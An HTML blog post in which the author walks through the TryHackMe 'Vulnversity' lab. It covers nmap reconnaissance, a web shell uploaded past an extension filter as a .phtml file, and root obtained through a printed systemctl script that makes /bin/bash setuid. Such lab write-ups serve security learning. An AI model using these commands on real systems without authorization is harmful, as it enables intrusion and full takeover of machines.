<!DOCTYPE html>
<html lang="en">

<head>

  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="Leo Smith's website, specialized in cyber security research, programming and audit. This website also contains my personal cyber security write ups and tools.">
  <meta name="author" content="Leo Smith">

  <title>Leo Smith - Vulnversity</title>

  <!-- Bootstrap core CSS -->
  <link href="../vendor/bootstrap/css/bootstrap.min.css" rel="stylesheet">

  <!-- Custom fonts for this theme -->
  <link href="../vendor/fontawesome-free/css/all.min.css" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Montserrat:400,700" rel="stylesheet" type="text/css">
  <link href="https://fonts.googleapis.com/css?family=Lato:400,700,400italic,700italic" rel="stylesheet" type="text/css">

  <!-- Theme CSS -->
  <link href="../css/freelancer.css" rel="stylesheet">
  <link href="../css/blog-post.css" rel="stylesheet">
  <link rel="shortcut icon" type="image/png" href="../img/favicon.png"/>
  <!-- Custom styles for this template -->

</head>

<body id="page-top">


  <!-- Navigation -->
  <nav class="navbar navbar-expand-lg bg-secondary text-uppercase fixed-top" id="mainNav">
    <div class="container">
      <a class="navbar-brand js-scroll-trigger" href="#page-top">Leo Smith</a>
      <button class="navbar-toggler navbar-toggler-right text-uppercase font-weight-bold bg-primary text-white rounded" type="button" data-toggle="collapse" data-target="#navbarResponsive" aria-controls="navbarResponsive" aria-expanded="false" aria-label="Toggle navigation">
        Menu
        <i class="fas fa-bars"></i>
      </button>
      <div class="collapse navbar-collapse" id="navbarResponsive">
        <ul class="navbar-nav ml-auto">
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="../index.html">Home</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="../writeups/">Write-Ups</a>
          </li>
          <li class="nav-item mx-0 mx-lg-1">
            <a class="nav-link py-3 px-0 px-lg-3 rounded js-scroll-trigger" href="../projects/">Projects</a>
          </li>
        </ul>
      </div>
    </div>
  </nav>

  <!-- Page Content -->
  <div class="container post">

    <div class="row">

      <!-- Post Content Column -->
      <div class="col-lg-8">

        <!-- Title -->
        <h1 class="mt-4">Vulnversity - How I'm getting the hang of it</h1>

        <!-- Author -->
        <p class="lead">
          by Leo Smith /
          <a href="https://github.com/p4p1">p4p1</a>
        </p>

        <hr>

        <!-- Date/Time -->
        <p>Created on Wed. 22 April 2020</p>

        <hr>

        <!-- Preview Image -->
        <img class="img-fluid rounded" src="https://tryhackme-images.s3.amazonaws.com/room-icons/b460a6717d1e74ebfa38aa04db675c49.png" alt="">

        <hr>

        <!-- Post Content -->
        <p class="lead">
          For my second write-up I clearly became so much better at resolving
          boxes compared to before. I managed to finish this one with less help than before,
          I was able to exploit it so much better than the last one. The part I got stuck at was
          the tty aspect of my shell...
        </p>

        <h3 id="recon">Reconnaissance</h3>
        <p>
          As usual I begin with a classic nmap, most of the recon I usually try and
          do as much as possible without the help that the room ensures.
        </p>

        <pre>
          <code class="prettyprint">
            nmap -sV x.x.x.x

            Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-21 02:12 CEST
            Nmap scan report for 10.10.76.153
            Host is up (0.022s latency).
            Not shown: 994 closed ports
            PORT     STATE SERVICE     VERSION
            21/tcp   open  ftp         vsftpd 3.0.3
            22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
            139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
            445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
            3128/tcp open  http-proxy  Squid http proxy 3.5.12
            3333/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
            Service Info: Host: VULNUNIVERSITY; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

            Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
            Nmap done: 1 IP address (1 host up) scanned in 22.18 seconds

            nmap --script vuln x.x.x.x

            Starting Nmap 7.60 ( https://nmap.org ) at 2020-04-21 02:12 CEST
            Pre-scan script results:
            | broadcast-avahi-dos:
            |   Discovered hosts:
            |     224.0.0.251
            |   After NULL UDP avahi packet DoS (CVE-2011-1002).
            |_  Hosts are all up (not vulnerable).
            Nmap scan report for 10.10.76.153
            Host is up (0.022s latency).
            Not shown: 994 closed ports
            PORT     STATE SERVICE
            21/tcp   open  ftp
            |_sslv2-drown:
            22/tcp   open  ssh
            139/tcp  open  netbios-ssn
            445/tcp  open  microsoft-ds
            3128/tcp open  squid-http
            3333/tcp open  dec-notes

            Host script results:
            |_smb-vuln-ms10-054: false
            |_smb-vuln-ms10-061: false
            | smb-vuln-regsvc-dos:
            |   VULNERABLE:
            |   Service regsvc in Microsoft Windows systems vulnerable to denial of service
            |     State: VULNERABLE
            |       The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference
            |       pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes
            |       while working on smb-enum-sessions.
            |_

            Nmap done: 1 IP address (1 host up) scanned in 45.20 seconds
          </code>
        </pre>

        <p>
          After the end of the first nmap scan I started looking around the web server
          that is hosted on port 3333. With no more information on the website
          and no vulnerabilities to exploit from the nmap, I returned to the tryhackme page.
        </p>
        <img class="img-fluid rounded" src="img/vulnversity/webpage.png" alt="">
        <p></p>
        <h3 id="dir">Dir busting</h3>
        <p>
          After filling up the reconnaissance page I went to the next step about
          dirbuster where I decided to use another tool, owasp zapproxy, to see if I
          could achieve the same result with another tool.
        </p>
        <img class="img-fluid rounded" src="img/vulnversity/zapdir.png" alt="">
        <p></p>
        <p>
          Amazing! After waiting for the zap proxy to finish there was a
          /internal/ entry returned by the program. When I opened it there was a nice
          upload page.
        </p>
        <img class="img-fluid rounded" src="img/vulnversity/upload.png" alt="">
        <p></p>
        <p>
          On that upload page I tried uploading a .php file and I got an error saying
          that I couldn't upload .php files.
        </p>
        <h3 id="compromise">Compromisation of server</h3>
        <p>
          So then I went back to the tryhackme page and filled in all of the answers
          corresponding to the dirbuster research. I looked into the next section
          where they indicated that you need to compromise the webserver using
          burpsuite. Following their indications, I opened burpsuite and did the
          different steps. Not that hard innit.
        </p>
        <img class="img-fluid rounded" src="img/vulnversity/phpext.png" alt="">
        <p></p>
        <p>
          After finding the extension that is expected to upload, I then renamed
          my phpbash.php script to phpbash.phtml. So that I can compromise the
          webserver.
        </p>
        <img class="img-fluid rounded" src="img/vulnversity/phpbash.png" alt="">
        <p></p>
        <h3 id="privesc">Privilege escalation</h3>
        <p>
          With the information I extracted, the first flag in the home folder
          of the main user, I looked back on the tryhackme page and I figured out I needed
          to do some simple privesc. So then I started scanning the system for setuid programs
          with:
        </p>
        <pre>
          <code class="prettyprint">
            find / -perm -4000
          </code>
        </pre>
        <p>
          Looking at the output of the command, I saw that systemctl had a suid bit
          active. I researched on gtfobins what I could do with systemctl and
          if I could do some privilege escalation.
        </p>
        <p>
          Finding that it was possible, I first wanted to upgrade my shell to a cleaner
          one. By looking at two tutorials online (see links) I then upgraded my shell.
        </p>
        <p>
          I then, with that new information started working on the exploit I wanted to use:
        </p>
        <pre>
          <code class="prettyprint">
            TF=$(mktemp).service
            echo '[Service]
            Type=oneshot
            ExecStart=/bin/sh -c "chmod +s /bin/bash"
            [Install]
            WantedBy=multi-user.target' > $TF
            /bin/systemctl link $TF
            /bin/systemctl enable --now $TF
          </code>
        </pre>
        <p>
          The exploit I implemented is to try to make bash a suid program so that
          if I run bash -p I keep the root permissions of the setuid bit.
          With that I had total access to the machine.
        </p>
        <hr />
        <p>
          Working on this second machine was a lot less stressful than last time.
          I took more time to study and research the different topics.
          In conclusion, this was fun, I used less external help and reverted to old
          writeups so that I could upgrade my reverse shell. This room gave me an
          idea. I'm going to code my own reverse shell that spawns automatically in
          the fake tty mode so that I never go back to the struggle of trying to
          get a clean shell. This will probably be showcased in my next writeup.
        </p>
        <p>
          Thank you for reading, please follow me on github and check out my other
          writeups.
        </p>
      </div>

      <div class="col-md-4">
        <div class="card my-4">
          <h5 class="card-header">Categories</h5>
          <div class="card-body">
            <div class="row">
              <div class="col-lg-6">
                <ul class="list-unstyled mb-0">
                  <li>
                    <a href="#recon">Reconnaissance</a>
                  </li>
                  <li>
                    <a href="#dir">Dir busting</a>
                  </li>
                  <li>
                    <a href="#compromise">Compromisation of server</a>
                  </li>
                  <li>
                    <a href="#privesc">Privilege escalation</a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>
        <!-- Dark mode Widget -->
        <div class="card my-4">
          <h5 class="card-header">Dark Mode</h5>
          <div class="card-body">
            <label class="switch">
              <input type="checkbox" id="toggleshade" onclick="shade();shade2();">
              <span class="slider round"></span>
            </label>
          </div>
        </div>
        <div class="card my-4">
          <h5 class="card-header">My tryhackme account</h5>
          <div class="card-body">
            <script src="https://tryhackme.com/badge/17154"></script>
          </div>
        </div>
        <!-- Share widget -->
        <div class="card my-4">
          <h5 class="card-header">Share</h5>
          <div class="card-body">
            <!-- AddToAny BEGIN -->
            <div class="a2a_kit a2a_kit_size_32 a2a_default_style center">
              <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
              <a class="a2a_button_google_gmail"></a>
              <a class="a2a_button_facebook"></a>
              <a class="a2a_button_twitter"></a>
              <a class="a2a_button_reddit"></a>
            </div>
            <script async src="https://static.addtoany.com/menu/page.js"></script>
            <!-- AddToAny END -->
          </div>
        </div>
        <!-- Categories Widget -->
        <div class="card my-4">
          <h5 class="card-header">Links</h5>
          <div class="card-body">
            <div class="row">
              <div class="col-lg-6">
                <ul class="list-unstyled mb-0">
                  <li>
                    <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">Upgrade dirty shell explanation</a>
                  </li>
                  <li>
                    <a href="https://exploits.run/ignite/">Writeup I used to upgrade my dirty shell</a>
                  </li>
                  <li>
                    <a href="https://tryhackme.com/room/vulnversity">The challenge</a>
                  </li>
                  <li>
                    <a href="markdown/Vulniversity.md">Mardown Write-up</a>
                  </li>
                </ul>
              </div>
            </div>
          </div>
        </div>


      </div>

    </div>
    <!-- /.row -->

  </div>
  <!-- /.container -->

  <!-- Footer -->
  <footer class="footer text-center">
    <div class="container">
      <div class="row">

        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">Share</h4>
          <!-- AddToAny BEGIN -->
          <div class="a2a_kit a2a_kit_size_32 a2a_default_style center">
            <a class="a2a_dd" href="https://www.addtoany.com/share"></a>
            <a class="a2a_button_google_gmail"></a>
            <a class="a2a_button_facebook"></a>
            <a class="a2a_button_twitter"></a>
            <a class="a2a_button_reddit"></a>
          </div>
          <script async src="https://static.addtoany.com/menu/page.js"></script>
          <!-- AddToAny END -->
        </div>

        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">About this page</h4>
          <p class="lead mb-0">Template found <a target="_blank" rel="noopener noreferrer" href="https://startbootstrap.com/themes/freelancer/">here</a>.</p>
        </div>

        <div class="col-lg-4 mb-5 mb-lg-0">
          <h4 class="text-uppercase mb-4">Follow me</h4>
          <a class="btn btn-outline-light btn-social mx-1" href="https://www.linkedin.com/in/leo-smith/">
            <i class="fab fa-fw fa-linkedin-in"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="https://github.com/p4p1">
            <i class="fab fa-github"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="https://linuxsecurity.expert/p/leo-smith">
              <i class="fab fa-linux"></i>
          </a>
          <a class="btn btn-outline-light btn-social mx-1" href="https://tryhackme.com/p/p4p1">
              <i class="fas fa-flag-checkered"></i>
          </a>
        </div>

      </div>
    </div>
  </footer>
  <!-- Copyright Section-->
  <section class="copyright py-4 text-center text-white">
    <div class="container"><small>Copyright © Leo Smith 2020</small></div>
  </section>
  <!-- Scroll to Top Button (Only visible on small and extra-small screen sizes) -->
  <div class="scroll-to-top d-lg-none position-fixed ">
    <a class="js-scroll-trigger d-block text-center text-white rounded" href="#page-top">
      <i class="fa fa-chevron-up"></i>
    </a>
  </div>

  <!-- Bootstrap core JavaScript -->
  <script src="../vendor/jquery/jquery.min.js"></script>
  <script src="../vendor/bootstrap/js/bootstrap.bundle.min.js"></script>

  <!-- Plugin JavaScript -->
  <script src="../vendor/jquery-easing/jquery.easing.min.js"></script>

  <!-- Contact Form JavaScript -->
  <script src="../js/jqBootstrapValidation.js"></script>
  <script src="../js/contact_me.js"></script>

  <!-- Custom scripts for this template -->
  <script src="../js/freelancer.min.js"></script>
  <script src="../js/hidden.js"></script>

  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163484307-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());
    gtag('config', 'UA-163484307-1');
  </script>

  <script>
    var card = document.getElementsByClassName("card");
    var h4Elements = document.getElementsByTagName("h4");
    var dark2=getDarkcookie();
    document.addEventListener('keypress', logKey2);
    if (dark2 == 1) {
      for (var i = 0; i < card.length; i++) {
        card[i].style.backgroundColor = "#423d3d";
      }
    }
    function logKey2(e) {
      if (e.key === 'b') {
        if (dark2 == 0) {
          document.getElementById("toggleshade").checked = true;
          document.cookie = "dark=1";
          for (var i = 0; i < card.length; i++) {
            card[i].style.backgroundColor = "#423d3d";
          }
          for(var i = 0; i < h4Elements.length; i++) {
               h4Elements[i].style.color = "#fff";
          }
          dark2 = 1;
        } else {
          document.getElementById("toggleshade").checked = false;
          document.cookie = "dark=0";
          document.body.style.color = "#000"
          for (var i = 0; i < card.length; i++) {
            card[i].style.backgroundColor = "#FFF";
          }
          for(var i = 0; i < h4Elements.length; i++) {
               h4Elements[i].style.color = "#fff";
          }
          dark2 = 0;
        }
      }
    }
    function shade2() {
      if (dark2 == 0) {
        document.getElementById("toggleshade").checked = true;
        document.cookie = "dark=1";
        for (var i = 0; i < card.length; i++) {
          card[i].style.backgroundColor = "#423d3d";
        }
        for(var i = 0; i < h4Elements.length; i++) {
             h4Elements[i].style.color = "#fff";
        }
        dark2 = 1;
      } else {
        document.getElementById("toggleshade").checked = false;
        document.cookie = "dark=0";
        document.body.style.color = "#000"
        for (var i = 0; i < card.length; i++) {
          card[i].style.backgroundColor = "#FFF";
        }
        for(var i = 0; i < h4Elements.length; i++) {
             h4Elements[i].style.color = "#fff";
        }
        dark2 = 0;
      }
    }
  </script>
  <script src="https://cdn.jsdelivr.net/gh/google/code-prettify@master/loader/run_prettify.js"></script>

</body>

</html>
